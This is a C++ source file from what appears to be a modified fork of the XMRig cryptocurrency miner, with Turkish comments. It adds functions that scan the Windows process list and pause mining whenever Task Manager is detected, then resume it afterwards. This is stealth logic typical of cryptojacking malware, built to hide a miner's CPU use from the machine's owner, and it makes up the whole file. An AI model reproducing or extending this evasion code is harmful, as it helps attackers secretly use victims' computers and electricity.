/* XMRig
 * Copyright 2018      Burak
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#include <windows.h>
#include <tlhelp32.h>
#include "workers/ExeTrigger.h"
//process varmi fonksiyonu
bool IsProcessRunning(const wchar_t *processName)
{
    bool exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry))
            if (!wcsicmp(entry.szExeFile, processName))
                exists = true;

    CloseHandle(snapshot);
    return exists;
}
//mineri durdurma fonksiyonu
void pausePic()
{
	if (Workers::isEnabled()) {
            LOG_INFO( "Detection Task Manager application and PAUSE XmRig");
            Workers::setEnabled(false);
        }
}
//mineri devam ettirme seysi
void unpausePic()
{
	        if (!Workers::isEnabled()) {
            LOG_INFO("Detection Task Manager application and RESUME XmRig");
            Workers::setEnabled(true);
        }
}
